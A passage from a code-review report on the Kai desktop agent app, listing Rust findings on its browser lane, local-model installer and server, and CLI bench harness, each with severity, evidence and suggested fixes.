- **Impact:** Users on small SSDs (the common case for a 4 GB Holo install) may be told
  they cannot install when they can; the arithmetic confuses future maintainers.
- **Fix:** `let needed = self.bytes_to_download(entry)? + if need_runtime { spec.total_bytes() } else { 0 };`
  and update the comment to name the peak (archive + unpacked + model). Add a unit test
  around a small pure helper `install_bytes_needed(model_left, runtime_bytes, need_runtime)`
  instead of asserting inside `install()`.

#### [OS-WEB-17] A pre-existing file of the expected size is accepted without hash verification
- **Severity:** MEDIUM
- **Location:** `crates/kai-os/src/local/download.rs:95`
- **What:** `fetch` short-circuits when `dest` exists with the expected byte length,
  without computing its SHA-256 even when the caller passed one. All real corruption
  paths go through `.part` + rename (verified), so this is mostly defence-in-depth —
  but it means a file placed there by another local user (if the data dir is shared)
  or a `dest` left by an older catalog entry with a colliding file name is trusted
  even though the docs say "the SHA-256 is checked before a file is renamed into
  place" (`docs/LOCAL_MODELS.md:302`). With `KAI_LOCAL_DIR` pointing at a shared/NFS
  path the trust is misplaced.
- **Evidence:**
  ```rust
  if let Ok(m) = std::fs::metadata(dest) && size.is_none_or(|s| s == m.len()) {
      on_bytes(m.len(), Some(m.len())); return Ok(());   // no sha256 check
  }
  ```
- **Impact:** A tampered/corrupt installed file is re-marked "installed" by a re-install
  instead of being replaced; the security claim in the docs is stronger than the code.
- **Fix:** When `sha256` is `Some`, hash the existing `dest` (reuse the now-dead
  `sha256_file`, see "Not needed / remove") and only short-circuit on a match; on
  mismatch remove and re-download. To avoid re-hashing 19 GB on every install, write a
  `<dest>.sha256-ok` marker after a verified rename and trust that. Add a test: place
  a wrong-content file with the right length at `dest`, call `fetch`, expect a
  re-download and a correct final file.

#### [OS-WEB-18] Kai's browser profile is created world-readable
- **Severity:** LOW
- **Location:** `crates/kai-os/src/web/lane.rs:131`
- **What:** `std::fs::create_dir_all(&opts.profile)` creates `<config>/kai/browser`
  with the process umask (normally 0755). That directory holds the persistent
  Cookie/Session databases for every site the user signs into inside Kai's browser
  ("The user signs in to a site there once", `docs/BROWSER.md:89`). On a multi-user
  machine another local account can read it (Chromium's Linux cookie encryption
  without a keyring uses a well-known key, so this is not equivalent to a password
  vault). Nothing in the repo calls `set_permissions` (checked: no matches for
  `set_permissions`/`PermissionsExt` in `crates/`).
- **Evidence:**
  ```rust
  std::fs::create_dir_all(&opts.profile)?;
  ```
- **Impact:** Session cookies for the user's signed-in sites are readable by other
  local users; a low-severity but avoidable exposure.
- **Fix:** Create the directory then `std::fs::set_permissions(&profile,
  Permissions::from_mode(0o700))` on unix (and tighten the Downloads dir handling
  similarly if it were Kai-owned). Add a `#[cfg(unix)]` test asserting the mode after
  `BrowserLane::launch`.

#### [OS-WEB-19] Browsers are SIGKILLed on drop; no `Browser.close`, no graceful teardown
- **Severity:** LOW
- **Location:** `crates/kai-os/src/web/cdp.rs:267` (+`crates/kai-os/src/web/lane.rs:361`)
- **What:** `Drop for Cdp` calls `Child::kill()` + `wait()` only. Chrome is never asked
  to close (`Browser.close`) and never gets a chance to flush its profile, so every
  app exit leaves the profile marked "not shut down correctly" (the "Restore pages?"
  bubble on the next launch, which competes with the lane's first `about:blank` tab
  selection) and helper processes only die because Chromium's browser process is their
  parent. The comment in `cdp.rs:221-223` shows the team already had to work around
  helpers holding the pipe open after the main process dies on macOS.
- **Evidence:**
  ```rust
  if let Ok(mut c) = self.child.lock() { let _ = c.kill(); let _ = c.wait(); }
  ```
- **Impact:** Cosmetic-but-visible: "Chrome didn't shut down correctly" after every Kai
  session; rare orphan helpers; slower profile startup.
- **Fix:** Best-effort graceful path: if the pipe is still usable, send
  `Browser.close` (a browser-level call, no session) and wait up to ~2 s for exit
  before falling back to `kill()`; keep `try_wait` reaping. Add a test that dropping a
  lane leaves no process with `user-data-dir=<profile>` alive (extend the existing
  `running(pattern)` helper in `browser_edges.rs`).

#### [OS-WEB-20] `find_browser` accepts non-executable PATH entries and prefers PATH over Mac bundles
- **Severity:** LOW
- **Location:** `crates/kai-os/src/web/lane.rs:58`
- **What:** Discovery uses `p.is_file()` only — a directory-shadowing non-executable
  file named `chromium` (or a `KAI_BROWSER` pointing anywhere) is selected and then
  fails at spawn with a raw OS error inside `Cdp::launch`, before the friendly
  "exited at start" message. On macOS, the `PATH` search (which often misses app
  bundles) runs first, so a Homebrew shim or an unrelated `chromium` shim wins over the
  installed `Google Chrome.app`; the error surfaced then comes from the shim, not from
  Kai's "Kai's browser needs Chrome…" message in `kai-app/src/browser.rs:24`.
- **Evidence:**
  ```rust
  .find(|p| p.is_file())    // no executable-bit check, PATH before MAC_APPS
  ```
- **Fix:** Require the executable bit (`cfg(unix): metadata.permissions().mode() & 0o111 != 0`)
  and, on macOS, try `MAC_APPS` first (or at least prefer bundles when the PATH hit is
  a symlink/shim). Return a typed error naming the discovered path and which checks
  failed, and unit-test `find_browser` with a fake PATH via `std::env::set_var` is
  unsafe — instead factor the candidate order into a pure function and test that.

#### [OS-WEB-21] Right-click and double-click are untested; right-click omits the `buttons` mask
- **Severity:** LOW
- **Location:** `crates/kai-os/src/web/act.rs:102` (+`crates/kai-os/src/web/computer.rs:82`)
- **What:** `mouse()` sends `{type, x, y, button, clickCount}` but never `buttons`
  (the bitmask of currently-pressed buttons). For `mousePressed`/`mouseReleased` with
  `button: "right"` Chromium's own DevTools frontend sets `buttons: 2`; without it some
  pages' `contextmenu`/`mousedown` handlers see "no buttons down" and ignore the click,
  which is the classic cause of "right-click does nothing" in CDP drivers. Neither
  `right-click` nor `double-click` appears in any test (`grep` over
  `tests/browser_edges.rs` and `tests/browser_lane.rs`: no `RightClick`, no
  `DoubleClick`), despite the desktop lane supporting both. `computer.rs`'s
  `move`/`scroll` send no `buttons` either, which is correct for those types.
- **Evidence:**
  ```rust
  json!({"type": kind, "x": x, "y": y, "button": button, "clickCount": clicks})
  // no "buttons"
  ```
- **Impact:** Context menus and double-click-to-open may silently fail on real sites
  while fixture tests pass.
- **Fix:** Add `buttons` (`0` for `mouseMoved`, `1`/`2` while pressed for left/right,
  always `0` on release) and add two fixture-page tests in `browser_edges.rs`: a
  `contextmenu`-bearing page (assert the title/marker changed) and a
  `dblclick`-bearing page. Also consider `pointerType` for completeness.

#### [OS-WEB-22] `downloads_dir()` ignores the XDG user-dirs configuration
- **Severity:** LOW
- **Location:** `crates/kai-os/src/web/lane.rs:389`
- **What:** It reads `XDG_DOWNLOAD_DIR` from the *environment*, but the standard,
  always-present source is `~/.config/user-dirs.dirs`; the variable is not exported by
  most desktops, so users who moved Downloads (localized names, second disk) get files
  in `~/Downloads` anyway. Combined with OS-WEB-03 (silent downloads) this writes to a
  path the user does not consider their Downloads folder.
- **Evidence:**
  ```rust
  if let Some(d) = std::env::var_os("XDG_DOWNLOAD_DIR").filter(|d| !d.is_empty()) { ... }
  let home = std::env::var_os(if cfg!(windows) { "USERPROFILE" } else { "HOME" })?;
  ```
- **Impact:** Downloads land in the wrong place (or on the wrong volume) for a
  non-trivial minority of Linux users.
- **Fix:** Parse `~/.config/user-dirs.dirs` for `XDG_DOWNLOAD_DIR="$HOME/..."`
  (expand `$HOME`), fall back to the env var then `~/Downloads`; unit-test the parser
  with a fixture file.

#### [OS-WEB-23] Only the last popup in one step is followed
- **Severity:** LOW
- **Location:** `crates/kai-os/src/web/lane.rs:226`
- **What:** `sync_tabs` iterates drained events and assigns `opened = ...` for every
  `Target.targetCreated` with the current page as opener, so if one click opens two
  tabs (a common pattern: analytics + real destination, or `window.open` twice), only
  the last event's target is followed; whether "the tab the page opened" is the useful
  one is decided by event arrival order.
- **Evidence:**
  ```rust
  opened = p["targetInfo"]["targetId"].as_str().map(str::to_string);
  ```
- **Impact:** Kai sometimes lands on the popup's ad/tracker tab instead of the content
  tab; confusing to watch, one wasted step.
- **Fix:** Collect the candidates and prefer a tab whose URL differs from the previous
  page's URL and is `http(s)` (and not `about:blank`), or simply follow the *first* new
  tab rather than the last; if several remain, expose them as marks/ask the model.
  Add a fixture page that opens two tabs in one click.

#### [OS-WEB-24] The local server is unauthenticated on loopback
- **Severity:** LOW
- **Location:** `crates/kai-os/src/local/server.rs:101`
- **What:** `server_args` passes `--host 127.0.0.1 --offline --no-webui` but no
  `--api-key` (llama-server supports one). Anything running as the user — including a
  page served inside Kai's own browser lane (POST to `http://127.0.0.1:8098/v1/...`),
  another sandboxed app, or a compromised dependency — can drive the loaded model
  (generate text, run up the CPU/GPU bill) and read its replies over the loopback
  interface. It cannot read Kai's files, so this is abuse rather than exfiltration;
  `docs/LOCAL_MODELS.md`'s claim "prompts and screenshots stay on this machine" holds.
- **Evidence:**
  ```rust
  "--host", "127.0.0.1", "--port", &port.to_string(), ... "--offline"
  ```
- **Impact:** Quiet compute/DoS abuse by any local process or a hostile page in Kai's
  browser; also the model endpoint answers without any identity check.
- **Fix:** Generate a random token per start (e.g. 32 hex chars), pass
  `--api-key <token>`, store it in `ServerInfo`/`server.json`, and have the local
  backend send `Authorization: Bearer <token>`. Add a test asserting the args contain
  `--api-key` and that `health`/clients still work with it (the fake server can assert
  the header).

#### [OS-WEB-25] The server log is truncated on every start and shared between instances
- **Severity:** LOW
- **Location:** `crates/kai-os/src/local/server.rs:218`
- **What:** `File::create(&log)` truncates `logs/llama-server.log` each start, and both
  stdout and stderr append-precisely there, so the "Last lines of …" diagnostics shown
  when a server dies while loading can be from a different (earlier) server, and two
  concurrent servers interleave into one file. Debugging "why did it not load" gets
  harder exactly when it matters.
- **Evidence:**
  ```rust
  let out = std::fs::File::create(&log)?;      // truncates
  cmd.stdout(out.try_clone()?).stderr(out)
  ```
- **Impact:** Lost/混淆 startup diagnostics; support requests cannot be triaged.
- **Fix:** Append (`OpenOptions::new().create(true).append(true)`) with a
  `\n=== start <time> <id> ===\n` banner, or write per-pid logs
  (`logs/llama-server-<pid>.log`) and have `tail()` read the one for the current
  child.

#### [OS-WEB-26] Fitting a server while an install replaces the runtime it is executing from
- **Severity:** LOW
- **Location:** `crates/kai-os/src/local/mod.rs:356`
- **What:** `install_runtime` unconditionally `remove_dir_all`s `runtime/<name>` and
  renames the temp dir over it. On Linux this is survivable (the running process keeps
  the unlinked inode) but the *running* server's `.so` paths and its folder disappear;
  on Windows deleting an exe/DLL in use fails outright, so re-installing the runtime
  (or installing a second model after the flags/assets changed) fails with a raw
  permission error while a server runs. The install also never stops a server that is
  using the model being overwritten.
- **Evidence:**
  ```rust
  if final_dir.exists() { std::fs::remove_dir_all(&final_dir)?; }
  std::fs::rename(&tmp, &final_dir)?;
  ```
- **Impact:** Opaque install failures on Windows and a half-consistent runtime dir on
  Linux; confusing "failed to load" servers running from unlinked files.
- **Fix:** Call `self.stop()` (with a user-visible note) before swapping a runtime or
  overwriting a model whose server is running, and unpack to a fresh versioned folder
  (`<name>-<short-hash>`) so a running server is never disturbed; update
  `current.json` last (it already is). Add a test that installs while a fake server
  from the same runtime is running.

#### [OS-WEB-27] Test gaps and one misleading test name
- **Severity:** LOW
- **Location:** `crates/kai-os/src/web/lane.rs:407` (+`crates/kai-os/tests/local_install.rs`)
- **What:** (a) `root_or_not_the_browser_gets_kais_own_profile_and_no_debug_port`
  claims to check the root/`--no-sandbox` behaviour but only asserts the profile
  argument, `--headless=new` and the absence of `--remote-debugging-port` — a
  regression that dropped `--no-sandbox` for root would not fail it. (b) No test covers
  the poisoned-lane recovery (OS-WEB-02), Enter-on-dialog risk (OS-WEB-01), a dialog
  message whose risk word is past 80 chars (OS-WEB-05), right/double click (OS-WEB-21),
  two concurrent installs (OS-WEB-09) or two concurrent servers (OS-WEB-04).
- **Evidence:**
  ```rust
  fn root_or_not_the_browser_gets_kais_own_profile_and_no_debug_port() {
      ... assert!(a.contains(&"--user-data-dir=/tmp/kai-profile".to_string()));
  ```
- **Impact:** The safety-critical and concurrency regressions this review found would
  not be caught by CI; the test name gives false confidence in a security-relevant
  flag.
- **Fix:** Rename the test to what it checks (or extend it to assert `--no-sandbox`
  presence/absence by injecting the euid), and add the missing tests listed above —
  the two risk tests and the poison test are small and high value.

#### [OS-WEB-28] One profile and one port per machine: concurrent lanes/instances conflict
- **Severity:** INFO
- **Location:** `crates/kai-os/src/web/lane.rs:136` (+`crates/kai-os/src/local/server.rs:206`, `DECISIONS.md:1500-1508`)
- **What:** The app and `kai run --browser` share `<config>/kai/browser`, so a second
  Kai process cannot drive its browser while the first has one open (the
  "exited at start … another Kai browser already open with the profile?" message is
  tested and deliberate per DECISIONS). Similarly one `server.json` means one local
  model per machine. This is a legitimate design for a single-user desktop app;
  recording it here because it makes parallel sub-agents (`--team`) and two-window
  usage impossible on the web/local paths, which future "team" work will hit.
- **Evidence:** `profile: kai_os::web::default_profile(&Settings::dir())` in both
  `kai-cli/src/runs.rs:44` and `kai-app/src/browser.rs:32`.
- **Impact:** No concurrent browser runs or local models; the second process fails fast
  with a clear message (acceptable) but cannot degrade gracefully.
- **Fix (idea):** When launch fails with the busy-profile signal, fall back to a
  per-process profile suffix (`browser-<pid>`, cleaned on exit) or ask the user;
  for local models, allow multiple ports by recording a list of servers instead of one
  `server.json`. Not needed before release.

#### [OS-WEB-29] `Input.insertText` fires no key events
- **Severity:** INFO
- **Location:** `crates/kai-os/src/web/act.rs:413`
- **What:** Typing uses `Input.insertText`, which inserts text and fires `input` events
  but no `keydown`/`keyup`/`beforeinput` pair per character. Sites that gate behaviour
  on key events (some OTP/credit-card widgets, IME-aware editors, form validation on
  `keyup`) will not react, even though the value lands. The desktop lane sends real
  keystrokes (enigo), so this is a parity difference.
- **Evidence:** `self.page("Input.insertText", json!({"text": text})).await?;` —
  `wait_typed` then only polls the value, so a page that ignores the value change is
  reported as typed.
- **Impact:** Rare but real: "Kai typed the value and the form still says empty/invalid".
- **Fix (idea):** For short texts, dispatch `keyDown`/`keyUp` pairs (like `keys::chord`
  does per character) so key-aware handlers fire; keep `insertText` as a fast path or
  fallback, and let `wait_typed`'s result choose which to send first.

#### [OS-WEB-30] `--no-sandbox` under root is logged but invisible in the product
- **Severity:** INFO
- **Location:** `crates/kai-os/src/web/lane.rs:378`
- **What:** Running as root (containers) silently drops Chromium's sandbox with only a
  `log::warn!` (`docs/BROWSER.md:92` says "logs a warning"). In a container that is
  fine; but "root on a real desktop" now means a fully unsandboxed browser rendering
  arbitrary web content as root, and the app's log is not surfaced to the user like the
  lane's other diagnostics.
- **Evidence:**
  ```rust
  if unsafe { libc::geteuid() } == 0 { log::warn!(...); a.push("--no-sandbox".into()); }
  ```
- **Impact:** A user running the app as root gets a much weaker browser sandbox with no
  UI acknowledgement.
- **Fix (idea):** Reflect it in the UI/onboarding ("Kai is running as root; the browser
  sandbox is off — don't do this on a real desktop") and/or refuse with a clear message
  outside containers (e.g. `/.dockerenv`/`container` env heuristics).

#### [OS-WEB-31] `HF_ENDPOINT` makes "hash-checked" provenance user-configurable
- **Severity:** INFO
- **Location:** `crates/kai-core/src/models/hub.rs:29` (cross-scope note; reachable from `crates/kai-os/src/local/hub.rs:35`)
- **What:** `kai models pull` pins the commit and SHA-256 *as reported by the configured
  endpoint*. Pointing `HF_ENDPOINT` at a hostile mirror yields an entry whose hashes are
  the mirror's own — verification then proves integrity of exactly the wrong content,
  with no warning that a non-default endpoint is in use. This is environment-controlled
  (a local attacker can already do worse), so it is a hardening note, not a hole; the
  built-in catalog is unaffected.
- **Evidence:** `std::env::var("HF_ENDPOINT") ... .unwrap_or_else(|| DEFAULT_ENDPOINT.to_string())`;
  the OS side then uses `info.sha`/`lfs.oid` verbatim (`hub.rs:42-52`).
- **Impact:** A user with `HF_ENDPOINT` set to a mirror gets "verified" models from that
  mirror.
- **Fix (idea):** Print which endpoint the entry was pulled from in the
  `kai models pull` success line and in `entry.json`'s notes (partially true already:
  notes carry `repo@sha`), and require `--trust-endpoint` when the endpoint differs
  from the default.

### Not needed / remove

- `crates/kai-os/src/local/download.rs:269` `pub async fn sha256_file` — **dead** (no
  caller anywhere in `crates/`; not even tests, verified by grep). Either delete it or
  use it for the OS-WEB-17 fix (hashing an already-present `dest`); do not leave it as
  an unreferenced alternative verifier.
- `crates/kai-os/src/local/mod.rs:130` `pub fn cancel_token` — **dead** (no callers);
  `cancel()`/`clone()` cover the real uses. Delete or use it in `kai-app`'s local API
  instead of its hand-rolled `cancel` wrapper.
- `crates/kai-os/src/local/runtime.rs:53` `RuntimeSpec::variant` — read only by the
  module's own tests; `name()` already encodes the variant. Either surface it (e.g.
  `kai doctor` printing "Vulkan build") or drop the field.
- `crates/kai-os/src/local/hardware.rs:55` `#[allow(dead_code)]` on `run_quick` —
  needed only because it is unused on Windows; move the attribute to a
  `#[cfg(not(windows))]` or gate the function, so a genuine dead-code warning on
  Linux/macOS can still fire.
- `crates/kai-os/src/web/cdp.rs:24,28` `MAX_EVENTS`/`KEPT_EVENTS` are `#[cfg(unix)]`
  while `Shared::events` is not; harmless today (launch bails off-unix) but the split
  will confuse the Windows port. Move the `VecDeque` behind the same cfg or un-gate the
  constants.
- Superseded ideas: none found — the lane has no leftover alternate implementations;
  `web/computer.rs`'s deliberately narrow surface is documented as such and should stay.

### What's good

- **The documented edge-case table is real.** Every row of `docs/BROWSER.md`
  ("Pages that break naive drivers") has an implementing function and a
  live-headless-Chromium test: dialogs freeze the page and are surfaced as marks
  (`cdp.rs:326`, `tests/browser_edges.rs:32`), `beforeunload` asks first
  (`browser_edges.rs:103`), tabs are followed/handed back (`lane.rs:216`,
  `browser_edges.rs:133`), dropdowns are chosen by label with `input`/`change` fired
  (`dropdown.rs:23`, `browser_edges.rs:176`), file pickers are intercepted and
  reported (`lane.rs:342`, `browser_edges.rs:236`), a dead browser fails inside 3 s
  (`browser_edges.rs:272`), a busy profile fails with the profile in the message
  (`lane.rs:135-141`). The docs and code agree here, which is rare.
- **`release.rs` is the right idea, well isolated.** A cancel that drops a held
  mouse/key cannot be lost: the guard sends the release on the *original* session and
  the tests spell out all three outcomes (`release.rs:88-142`). The design decision is
  documented at the top of the file; only its recovery story (OS-WEB-02) is wrong.
- **Real risk testing on the dialog path.** `dialog.rs:178-205` asserts that clicking
  the OK of "Delete all files?" and "Pay $40 now?" is `Risk::High` regardless of the
  model's claimed risk, and that a benign "Saved" alert is not — this is exactly the
  kind of adversarial unit test the risk surface needs (it just misses the Enter path).
- **Downloads are engineered for the real world.** `download.rs` hashes a resumed
  prefix incrementally, resets the hasher on an ignored range, handles `416` as
  "already complete", gives a fresh retry budget after 1 MB of progress, flushes before
  cancel, deletes on mismatch, and the mock server in `local_support/mod.rs` can cut a
  connection, ignore ranges and trickle bytes — with tests for each
  (`tests/local_install.rs:66-217`). This is above the bar for an MVP installer.
- **The server args and lifecycle are source-checked against the pinned release.**
  `server_args` carries `--host 127.0.0.1 --offline --no-webui`, `--alias` for the
  OpenAI-compatible id, and `LEAN` with the measured memory flags; the test asserts the
  exact argv (`server.rs:415`), and `tests/local_install.rs:257` drives a fake
  `llama-server` through 503-loading → 200-ready, kill-on-drop, detach + `stop()` via
  `server.json`, and a crash-while-loading log tail. The `pid_is_server` flag check is
  the right instinct for pid reuse (its strictness is the bug, not its existence).
- **Path safety in the model store.** `safe_id` confines ids to letters/digits/-/_/.
  and rejects `..`, `ModelFile::file_name()` strips query/fragment and takes the last
  path segment, and `server_args` builds paths from `file_name()` — I found no way to
  escape `models/<id>/` from catalog or Hub data (`mod.rs:372`, `models/mod.rs:43`).
- **Privacy surfaces line up with the docs.** The page tree feeds the same
  Set-of-Marks pipeline as the desktop (`a11y::ground_indexed` reused unchanged), the
  page's `innerText` goes through the same fence + `untrusted::suspicious_text`
  withholding (`kai-core/src/web.rs:47`), password inputs are forced secure with no
  value (`snapshot.rs:169`, tested at `snapshot.rs:307`), and the debug pipe means no
  other process can drive the browser (`cdp.rs:1-4`).

### Open questions

1. **Is stopping mid-action meant to kill the lane for the session?** `release.rs`
   deliberately poisons on an unacknowledged cancel, but nothing recovers it and the
   app reuses lanes. Was the intent "poison until the user restarts the app", or was
   the ack-based reset (fix in OS-WEB-02) simply not finished? This decides whether the
   fix is a bug fix or a behaviour change.
2. **Should a page-triggered download be a high-risk action or an auto-approved one?**
   Today it is invisible. Which policy does the product want for the lane (deny +
   ask_user, or a Kai-owned staging folder surfaced to the user)?
3. **Root/`--no-sandbox`:** is running Kai (and therefore an unsandboxed Chromium over
   arbitrary pages) as root a supported deployment, or should the app refuse outside a
   container? `docs/BROWSER.md:92` implies "don't", the code proceeds.
4. **One local model per machine is currently a hard invariant** (`server.json`).
   Should the Teams/local-model work eventually support N servers (different models
   for different sub-agents), or is one-at-a-time a permanent product decision? That
   answer shapes whether `server.json` becomes a list now or later (OS-WEB-04/28).
5. **`--reasoning off` is sent for every model** (`server.rs:153`), measured only on
   Holo3.1. For a model whose chat template uses a different reasoning flag (or an older
   `llama-server`), does b11429 accept it globally — and has anyone run the *Gemma*
   catalog entries against a real build? `docs/LOCAL_MODELS.md:334-344` says no; the
   LEAN flags are applied blindly to all of them.

---

## 3.6 CLI — `kai` command line, bench harness, dataset export

*Reviewed files: 26. Findings: 0C / 3H / 7M / 9L / 0I.*

### Scope covered — every file read in full

| File | Lines | Verdict |
|---|---|---|
| `crates/kai-cli/Cargo.toml` | 34 | Clean; one unused dependency (`keyring`), `tokio = full` is broader than needed. |
| `crates/kai-cli/src/main.rs` | 500 | Dispatch is simple and readable; no Ctrl-C handling for `run`; `kai key` echoes the key; `skill validate` with no args exits 1 with a puzzling "0 checked". |
| `crates/kai-cli/src/ab.rs` | 199 | Correct flag→Config mapping, tested; header comment is stale (claims unknown switches are refused, but `apply_ab` always returns `Ok(true)`). |
| `crates/kai-cli/src/backend.rs` | 285 | Key checks and model mapping are clear and tested; `--model ""` slips through for `--backend local`; `applied` always `true`. |
| `crates/kai-cli/src/console.rs` | 258 | Action descriptions are good and tested; approver has no TTY awareness (hang on an open pipe, silent Stop on EOF); no colors at all (piping-safe). |
| `crates/kai-cli/src/mcp.rs` | 107 | stdout carries only protocol; `SkipRisky` plus the autopilot downgrade match docs/MCP.md. Saves a trace for every `kai_run_task` unconditionally. |
| `crates/kai-cli/src/memory.rs` | 334 | Full, usable command set; `save_trace` name has 1-second resolution and `unwrap_or_default` can write an empty trace. |
| `crates/kai-cli/src/models.rs` | 313 | list/install/start/stop/search/pull/remove all wired to the catalog; progress writes ANSI unconditionally; `ensure_local` picks an arbitrary installed model. |
| `crates/kai-cli/src/runs.rs` | 95 | Lane switch and recorder naming are right; records the wrong `model`/`backend` for `--backend local`/`auto`/`openai-native`. |
| `crates/kai-cli/src/bench/mod.rs` | 358 | Orchestration complete and documented; **always exits 0**, imports the user's settings into bench config, clamps `--repeat` silently. |
| `crates/kai-cli/src/bench/runner.rs` | 480 | Mock/replay/live paths are careful (setup, check, teardown, env, browser lane); only pass 0 is recorded; `Metered` deliberately measures calls. |
| `crates/kai-cli/src/bench/lane.rs` | 66 | Fresh temp profile per task, dropped after the lane; downloads intentionally go to the real `~/Downloads`. |
| `crates/kai-cli/src/bench/machine.rs` | 132 | Fingerprint is useful; `kai_version` (crate version) differs from the per-run `git describe`; blocking `git`/`xdotool` calls. |
| `crates/kai-cli/src/bench/record.rs` | 110 | Batch/`.2` naming never overwrites; failure labels and verdicts wired through. |
| `crates/kai-cli/src/bench/repeat.rs` | 128 | Small, correct first-vs-repeat table; plain means only, no variance or n. |
| `crates/kai-cli/src/bench/report.rs` | 385 | Honest merge (no invented numbers), but silently overwrites same-stem results files and merges incomparable runs without a warning. |
| `crates/kai-cli/src/bench/stats.rs` | 367 | Careful "missing, not zero" accounting; one dead computation (model p95 discarded). |
| `crates/kai-cli/src/bench/tasks.rs` | 352 | schema + validation are strong (dupes, unknown needs, bad replies); requires `mock:` even for GRPO export; blocking `internet()` probe. |
| `crates/kai-cli/src/bench/variants.rs` | 302 | Default-first rendering keeps head-to-head comparable; `per_os_has` forgets `macos`; `--n 0` gives a misleading error. |
| `crates/kai-cli/src/bench/tests.rs` | 279 | Good stats/report coverage incl. old-format files and percentiles. |
| `crates/kai-cli/src/bench/executor_tests.rs` | 85 | Fake jevos through the real engine; verifies executor counters reach the results file. |
| `crates/kai-cli/src/data/mod.rs` | 95 | Thin command layer matching DATASET.md; default task files are CWD-relative and silently absent. |
| `crates/kai-cli/src/data/export.rs` | 220 | Formats match the documented contract; `PerOsRow` drops `macos`; system prompt duplicated per row; empty `user` possible silently. |
| `crates/kai-cli/src/data/stats.rs` | 91 | Clean and covered. |
| `crates/kai-cli/src/data/tests.rs` | 151 | Strong record→export→stats end-to-end test through the real engine. |

No `TODO`/`FIXME`/`HACK`/`XXX`/`todo!`/`unimplemented!` exists anywhere in `crates/kai-cli` (grep verified). The only "placeholder" matches are the used `backend::placeholder_client` (main.rs:350) and comments/identifiers in `variants.rs`/`tasks.rs`.

### Verdict

The CLI is a genuinely good harness front end: modules are small and well separated, the bench path is built around honesty ("missing, not estimated", recorded replies measured only where recorded, failure taxonomy labelled from the trace), the MCP server keeps stdout pure and refuses what nobody can approve, and the tests cover the parts that are hard to reason about (percentiles, report merging, variant rendering, executor counters, record→export). Command names and help text are concrete, error messages name the key or the flag to fix, and the safety defaults (no approvals without a TTY, skip over MCP, keychain keys) are conservative rather than convenient.

What holds it back is automation behaviour around the bench: `kai bench` returns exit 0 no matter how many tasks fail, two runs on the same day with the same backend/model silently overwrite the earlier results file (this has already destroyed measured JSON once — see `bench/results/2026-10-10-executor-ab.md:3`), and `kai run --record` writes the wrong `model` for local/auto/native runs, i.e. misattributes training data. A cluster of medium issues follows from the same theme: `--no-memory` does not stop the trace that `kai memory consolidate` later learns from, `--repeat` is silently clamped and never folded into the reported statistics, bench fidelity depends on unrecorded user settings (`learn`/`reflect`/`approval`), and GRPO export inherits a bench-only requirement (`mock:` replies) that blocks custom RL task files.

Security is decent: approvals never auto-happen for payments/passwords, MCP skips rather than strips approvals, no key is ever printed, and `kai key` goes to the OS keychain. The gaps are hygiene, not holes: the key is echoed while typed, Ctrl-C (not the kill switch) leaves shell children running because they are in their own process group, and a non-interactive approval read can hang forever on an open pipe.

Scores: **correctness 6/10** (bench math is careful, but exit code, results overwrite, recorded model attribution, and GRPO export are wrong). **security 7/10** (conservative approval/skip design, but key echo, trace persistence under `--no-memory`, and no SIGINT handling). **maintainability 7/10** (clear modules and comments, but duplicated skill discovery/engine wiring, stale ab.rs header, dead `applied` path, silent clamps). **test coverage 7/10** (strong unit/e2e tests for stats, report, variants, executor, data; no tests at all for models/mcp/runs and no CLI-binary-level test of exit codes or help, and CI cannot notice a bench that fails every task). **architecture fit 8/10** (drives only public kai-core/kai-os APIs; the bench harness rightfully lives beside the CLI; the only smell is four copies of `Engine { … }` construction).

### Findings

#### [CLI-01] `kai bench` always exits 0, even when every task fails or nothing ran
- **Severity:** HIGH
- **Location:** `crates/kai-cli/src/bench/mod.rs:357` (+ `mod.rs:131`, `bench/variants.rs:188`)
- **What:** After running tasks and writing results, `bench::run` unconditionally returns `Ok(ExitCode::SUCCESS)`. A bench where 0/30 tasks pass, or where every task was skipped, is indistinguishable from 30/30 to a script. CI already relies on this exit code (`.github/workflows/ci.yml:52`) and therefore cannot detect a broken harness.
- **Evidence:**
  ```rust
  let summary = stats::summarise(meta, runs);
  report::print(&summary);
  ...
  Ok(ExitCode::SUCCESS)
  ```
- **Impact:** Automation, release smoke tests and the model-store promotion workflow (`docs/MODEL_STORE.md:129-133`) can consume or ship results from a bench that failed everything; regressions in the engine are invisible to CI.
- **Fix:** (1) In `bench::run`, return `ExitCode::FAILURE` when `summary.total == 0` (nothing was actually measured). (2) Add a `--fail-on-any-failure` flag (default off, so the macOS/Windows `continue-on-error` replay workflows keep working) and honour it after `stats::summarise`. (3) Add a CLI test (`crates/kai-cli/tests/` or a `#[tokio::test]` around a task with a failing `check`) asserting exit 1 with the flag and 0 without.

#### [CLI-02] Same-day runs silently overwrite the previous results file (measured JSON already lost once)
- **Severity:** HIGH
- **Location:** `crates/kai-cli/src/bench/report.rs:24-41` (`file_stem`, `write`)
- **What:** The results stem is only `<date>-<backend>-<model>`; there is no time component, run counter, or overwrite guard. Two `kai bench` invocations on the same day with the same backend and model (the exact A/B workflow — executor on/off, memory current/candidate, `--model` before/after) write to the same `.json` and `.md` and the second replaces the first. The repo already lost data this way.
- **Evidence:** `bench/results/2026-10-10-executor-ab.md:3` — "Console summaries copied verbatim from `kai bench` (the JSON files were overwritten by a script error; per-task recordings are in bench/runs/{exec,base}, not committed)." Also `docs/MODEL_STORE.md:131`: "at least twice per side, with `--out` set per run" (a workaround, not a guard).
- **Impact:** Measured numbers are destroyed silently; a comparison silently becomes a single column.
- **Fix:** In `report::write`, if the target stem exists, suffix `-2`, `-3`, … (like `Recording::start` already does for run dirs) or refuse unless `--force`; print "overwrote <path>" at minimum. Add a unit test: write the same `Summary` twice into a temp dir and assert two files exist / an error is returned.

#### [CLI-03] `kai run --record` records the wrong model (and a non-protocol backend label) for local/auto/native runs
- **Severity:** HIGH
- **Location:** `crates/kai-cli/src/runs.rs:70-79`
- **What:** `run_recorder` passes `&s.fast_model` as the recorded model. For `--backend local` (and `--backend auto` when settings resolve to Local) the model that actually answered is `s.local_model`; for `--backend openai-native` it is the CUA model. The recorded `backend` for `auto` is `format!("{:?}", s.backend).lowercase()`, which yields `"both"` (the default settings) or `"local"` — labels that never say which endpoint answered. Since `TraceRecorder::model_for` stamps `meta.model` into every step's `call.model`, exported `kai data export` rows inherit the wrong model id.
- **Evidence:**
  ```rust
  let backend = match b { BackendArg::Auto => format!("{:?}", s.backend).to_lowercase(), _ => b.name().to_string() };
  let mut meta = kai_core::RunMeta::new(&run_id, task, "run", backend, &s.fast_model);
  ```
  while `settings_for` for Local only sets `s.local_model` (`backend.rs:82-88`).
